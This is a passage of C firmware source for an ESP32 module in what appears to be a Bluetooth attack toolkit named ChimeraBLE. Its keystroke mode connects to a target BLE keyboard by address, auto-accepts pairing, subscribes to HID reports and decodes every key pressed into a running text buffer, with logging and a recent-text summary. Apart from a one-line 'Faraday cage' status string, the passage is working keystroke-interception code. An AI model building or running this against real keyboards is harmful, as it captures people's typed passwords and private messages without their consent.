/* Find the HID Report characteristic and subscribe to notifications */
static int key_disc_svc_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_svc *svc, void *arg);
static int key_disc_chr_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_chr *chr, void *arg);

static uint16_t s_key_report_handle;  /* HID Report char value handle */

static int key_gap_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_key_conn = event->connect.conn_handle;
            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_keys) {
                s_keys->connected = true;
                strlcpy(s_keys->status, "connected, discovering HID service",
                        sizeof(s_keys->status));
            }
            xSemaphoreGive(s_lock);

            /* Discover HID service (UUID 0x1812) */
            ble_uuid16_t hid_uuid = BLE_UUID16_INIT(0x1812);
            ble_gattc_disc_svc_by_uuid(s_key_conn, &hid_uuid.u,
                                        key_disc_svc_cb, NULL);
        } else {
            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_keys) {
                snprintf(s_keys->status, sizeof(s_keys->status),
                         "connect failed: %d", event->connect.status);
            }
            s_status.active = false;
            xSemaphoreGive(s_lock);
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_keys) {
            s_keys->connected = false;
            s_keys->subscribed = false;
            strlcpy(s_keys->status, "disconnected", sizeof(s_keys->status));
        }
        s_status.active = false;
        xSemaphoreGive(s_lock);
        break;

    case BLE_GAP_EVENT_NOTIFY_RX: {
        /* HID report received! Parse it. */
        uint16_t len = OS_MBUF_PKTLEN(event->notify_rx.om);
        uint8_t buf[64];
        if (len > sizeof(buf)) len = sizeof(buf);
        os_mbuf_copydata(event->notify_rx.om, 0, len, buf);

        /* Standard HID keyboard report: [modifier, reserved, key1..key6]
         * 8 bytes total. */
        if (len >= 8 && event->notify_rx.attr_handle == s_key_report_handle) {
            uint8_t modifier = buf[0];
            /* buf[1] is reserved */

            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_keys) {
                s_keys->reports_received++;

                for (int k = 2; k < 8; k++) {
                    uint8_t keycode = buf[k];
                    if (keycode == 0) continue;

                    char ascii = hid_keycode_to_ascii(keycode, modifier);

                    chimera_keystroke_t ks = {
                        .modifier = modifier,
                        .keycode = keycode,
                        .ascii = ascii,
                        .key_down = true,
                        .timestamp_us = now_us(),
                    };

                    /* Store in ring buffer */
                    s_keys->keys[s_keys->key_head] = ks;
                    s_keys->key_head = (uint16_t)((s_keys->key_head + 1) %
                                                  CHIMERA_KEY_BUF_SIZE);
                    s_keys->keys_decoded++;

                    /* Append to text if printable */
                    if (ascii >= 0x20 && ascii < 0x7F &&
                        s_keys->text_len < CHIMERA_KEY_BUF_SIZE - 1) {
                        s_keys->text[s_keys->text_len++] = ascii;
                        s_keys->text[s_keys->text_len] = '\0';
                    } else if (ascii == '\b' && s_keys->text_len > 0) {
                        s_keys->text_len--;
                        s_keys->text[s_keys->text_len] = '\0';
                    } else if (ascii == '\n' &&
                               s_keys->text_len < CHIMERA_KEY_BUF_SIZE - 1) {
                        s_keys->text[s_keys->text_len++] = '\n';
                        s_keys->text[s_keys->text_len] = '\0';
                    }

                    snprintf(s_keys->status, sizeof(s_keys->status),
                             "%lu keys decoded, %lu reports",
                             (unsigned long)s_keys->keys_decoded,
                             (unsigned long)s_keys->reports_received);

                    s_status.events = s_keys->keys_decoded;

                    if (s_key_cb) {
                        s_key_cb(&ks);
                    }

                    chimera_log_event(CHIMERA_MODE_KEYSTROKE,
                                       s_keys->target_addr,
                                       "", 0, "key",
                                       s_keys->status);
                }
            }
            xSemaphoreGive(s_lock);
        }
        break;
    }

    case BLE_GAP_EVENT_ENC_CHANGE:
        ESP_LOGI(TAG, "keystroke: encryption established");
        break;

    case BLE_GAP_EVENT_PASSKEY_ACTION: {
        /* Accept pairing to access HID reports */
        struct ble_sm_io pk = {0};
        pk.action = event->passkey.params.action;
        if (pk.action == BLE_SM_IOACT_NUMCMP) {
            pk.numcmp_accept = 1;
        }
        ble_sm_inject_io(event->passkey.conn_handle, &pk);
        break;
    }

    default:
        break;
    }
    return 0;
}

static int key_disc_svc_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_svc *svc, void *arg)
{
    if (error->status == BLE_HS_EDONE) {
        return 0;
    }
    if (error->status != 0) {
        ESP_LOGW(TAG, "keystroke: HID service not found");
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_keys) {
            strlcpy(s_keys->status, "HID service not found", sizeof(s_keys->status));
        }
        xSemaphoreGive(s_lock);
        return 0;
    }

    /* Found HID service -- discover its characteristics */
    ble_gattc_disc_all_chrs(conn, svc->start_handle, svc->end_handle,
                            key_disc_chr_cb, NULL);
    return 0;
}

static int key_disc_chr_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_chr *chr, void *arg)
{
    if (error->status == BLE_HS_EDONE) {
        /* All chars discovered. Subscribe to the report handle if found. */
        if (s_key_report_handle) {
            uint8_t cccd[2] = { 0x01, 0x00 };  /* notifications ON */
            ble_gattc_write_flat(conn, s_key_report_handle + 1,
                                 cccd, 2, key_notify_cb, NULL);
        } else {
            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_keys) {
                strlcpy(s_keys->status, "HID Report char not found",
                        sizeof(s_keys->status));
            }
            xSemaphoreGive(s_lock);
        }
        return 0;
    }
    if (error->status != 0) return 0;

    /* Look for HID Report characteristic (UUID 0x2A4D) */
    if (chr->uuid.u.type == BLE_UUID_TYPE_16 &&
        BLE_UUID16(&chr->uuid)->value == 0x2A4D) {
        s_key_report_handle = chr->val_handle;
        ESP_LOGI(TAG, "keystroke: found HID Report at handle %u",
                 (unsigned)s_key_report_handle);
    }
    return 0;
}

esp_err_t chimera_keystroke_start(const uint8_t addr[6],
                                   uint8_t addr_type,
                                   chimera_keystroke_cb_t cb)
{
    if (!s_initialised || !s_lock) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_status.active) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    /* Lazy PSRAM allocation for keystroke state */
    if (!s_keys) {
        s_keys = psram_or_heap_calloc(1, sizeof(chimera_keystroke_state_t));
        if (!s_keys) {
            xSemaphoreGive(s_lock);
            ESP_LOGE(TAG, "cannot alloc s_keys in PSRAM");
            return ESP_ERR_NO_MEM;
        }
    }

    ble_gap_disc_cancel();
    vTaskDelay(pdMS_TO_TICKS(50));

    memset(s_keys, 0, sizeof(chimera_keystroke_state_t));
    memcpy(s_keys->target_addr, addr, 6);
    s_key_cb = cb;
    s_key_report_handle = 0;

    s_status.mode = CHIMERA_MODE_KEYSTROKE;
    s_status.active = true;
    s_status.events = 0;
    strlcpy(s_status.status, "keystroke: connecting to HID keyboard...",
            sizeof(s_status.status));
    xSemaphoreGive(s_lock);

    /* Enable bonding to pair with the keyboard */
    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_NO_IO;
    ble_hs_cfg.sm_bonding = 1;
    ble_hs_cfg.sm_mitm = 0;
    ble_hs_cfg.sm_sc = 1;

    ble_addr_t peer = { .type = addr_type };
    memcpy(peer.val, addr, 6);

    int rc = ble_gap_connect(s_own_addr_type, &peer, 10000, NULL,
                             key_gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "keystroke connect failed: %d", rc);
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_status.active = false;
        s_status.mode = CHIMERA_MODE_IDLE;
        xSemaphoreGive(s_lock);
        return ESP_FAIL;
    }

    chimera_log_event(CHIMERA_MODE_KEYSTROKE, addr, "", 0,
                       "start", "keystroke decode started");
    return ESP_OK;
}

esp_err_t chimera_keystroke_stop(void)
{
    if (s_keys && s_keys->connected) {
        ble_gap_terminate(s_key_conn, BLE_ERR_REM_USER_CONN_TERM);
    }

    if (s_initialised && s_lock) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_keys) {
            s_keys->connected = false;
            s_keys->subscribed = false;
        }
        s_key_cb = NULL;
        s_status.mode = CHIMERA_MODE_IDLE;
        s_status.active = false;
        xSemaphoreGive(s_lock);
    }

    if (s_keys) {
        chimera_log_event(CHIMERA_MODE_KEYSTROKE, s_keys->target_addr,
                           "", 0, "stop", "keystroke decode stopped");
    }
    return ESP_OK;
}

void chimera_keystroke_get_state(chimera_keystroke_state_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_keys) {
        *out = *s_keys;
    }
    xSemaphoreGive(s_lock);
}

bool chimera_keystroke_get_summary(chimera_keystroke_summary_t *out)
{
    if (!out) return false;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return false;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_keys) {
        xSemaphoreGive(s_lock);
        return false;
    }
    memcpy(out->target_addr, s_keys->target_addr, 6);
    out->connected = s_keys->connected;
    out->subscribed = s_keys->subscribed;
    out->reports_received = s_keys->reports_received;
    out->keys_decoded = s_keys->keys_decoded;

    const char *text = s_keys->text;
    size_t tlen = s_keys->text_len;
    if (tlen > 80) text = s_keys->text + tlen - 80;
    strlcpy(out->recent_text, text, sizeof(out->recent_text));

    bool conn = s_keys->connected;
    xSemaphoreGive(s_lock);
    return conn;
}

void chimera_keystroke_clear(void)
{
    if (!s_initialised || !s_lock) return;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_keys) {
        s_keys->text_len = 0;
        s_keys->text[0] = '\0';
        s_keys->key_head = 0;
        s_keys->keys_decoded = 0;
    }
    xSemaphoreGive(s_lock);
}

/* ================================================================== *
 *  Init and status                                                    *
 * ================================================================== */

esp_err_t chimera_init(void)
{
    if (s_initialised) return ESP_OK;

    if (!s_lock) {
        s_lock = xSemaphoreCreateMutex();
        if (!s_lock) return ESP_ERR_NO_MEM;
    }

    if (!s_scan_table) {
        s_scan_table = psram_or_heap_calloc(CHIMERA_SCAN_TABLE_SIZE, sizeof(chimera_scan_result_t));
        if (!s_scan_table) {
            ESP_LOGE(TAG, "failed to allocate scan table");
            return ESP_ERR_NO_MEM;
        }
    }

    if (!s_fp_results) {
        s_fp_results = psram_or_heap_calloc(CHIMERA_SCAN_TABLE_SIZE, sizeof(chimera_fingerprint_t));
        if (!s_fp_results) {
            ESP_LOGE(TAG, "failed to allocate fingerprint table");
            return ESP_ERR_NO_MEM;
        }
    }

    memset(&s_status, 0, sizeof(s_status));
    s_status.mode = CHIMERA_MODE_IDLE;
    strlcpy(s_status.status, "idle", sizeof(s_status.status));
    strlcpy(s_status.detail, "Ready. Faraday cage RF containment only.", sizeof(s_status.detail));

    /* Get our BLE address type from NimBLE */
    if (ble_hs_id_infer_auto(0, &s_own_addr_type) != 0) {
        ESP_LOGW(TAG, "could not infer address type, using public");
        s_own_addr_type = BLE_OWN_ADDR_PUBLIC;
    }

    chimera_log_open();

    s_initialised = true;
    ESP_LOGI(TAG, "ChimeraBLE toolkit initialised (PSRAM allocated)");
    return ESP_OK;
}

void chimera_get_status(chimera_status_t *out)
{
    if (!out) return;
    if (!s_initialised || !s_lock) {
        memset(out, 0, sizeof(*out));
        out->mode = CHIMERA_MODE_IDLE;
        out->active = false;
        strlcpy(out->status, "toolkit unavailable", sizeof(out->status));
        strlcpy(out->detail, "Radio link down or toolkit uninitialized", sizeof(out->detail));
        return;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    *out = s_status;
    xSemaphoreGive(s_lock);
}

void chimera_log_status(chimera_log_status_t *out)
{
    if (!out) return;
    if (!s_initialised || !s_lock) {
        memset(out, 0, sizeof(*out));
        return;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    *out = s_log;
    xSemaphoreGive(s_lock);
}
